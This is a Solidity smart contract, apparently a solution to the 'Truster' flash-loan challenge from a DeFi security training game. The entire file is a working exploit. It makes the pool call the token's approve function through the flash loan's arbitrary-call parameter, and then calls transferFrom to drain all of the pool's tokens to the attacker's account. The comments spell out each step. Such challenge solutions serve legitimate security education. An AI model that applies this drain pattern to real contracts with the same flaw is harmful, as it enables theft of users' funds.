pragma solidity ^0.6.0;


import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";

interface ITrusterLenderPool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

contract TrusterAttacker {
    using SafeMath for uint256;
    using Address for address payable;

    constructor() public {}

    function attack(IERC20 token, ITrusterLenderPool pool, address attackerEOA)
        public
    {
        uint256 poolBalance = token.balanceOf(address(pool));
        // IERC20::approve(address spender, uint256 amount)
        // flashloan executes "target.call(data);", approve our contract to withdraw all liquidity
        bytes memory approvePayload = abi.encodeWithSignature("approve(address,uint256)", address(this), poolBalance);
        pool.flashLoan(0, attackerEOA, address(token), approvePayload);

        // once approved, use transferFrom to withdraw all pool liquidity
        token.transferFrom(address(pool), attackerEOA, poolBalance);
    }
}
